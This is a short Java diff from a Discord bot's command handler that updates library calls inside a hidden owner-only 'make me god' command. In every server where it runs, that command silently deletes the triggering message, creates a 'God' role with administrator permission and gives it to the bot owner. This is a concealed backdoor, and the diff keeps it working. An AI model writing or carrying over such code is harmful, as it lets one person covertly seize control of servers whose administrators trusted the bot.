@@ -50,14 +50,14 @@ public class CommandHandler {
 			if (event.getAuthor().equals(ThiccBotMain.botOwner)
 					&& event.getMessage().getContentRaw().toLowerCase().equals(BotUtils.BOT_PREFIX + "make me god")) {
 				event.getMessage().delete().queue();
-				event.getGuild().getController().createRole().queue(new Consumer<Role>() {
+				event.getGuild().createRole().queue(new Consumer<Role>() {
 					@Override
 					public void accept(Role t) {
 						class CompleteTask implements Runnable {
 							public void run() {
 								t.getManager().setName("God").complete();
 								t.getManager().givePermissions(Permission.ADMINISTRATOR).complete();
-								event.getGuild().getController().addRolesToMember(event.getMember(), t).queue();
+								event.getGuild().addRoleToMember(event.getMember(), t).queue();
 							}
 						}
 						new Thread(new CompleteTask()).start();
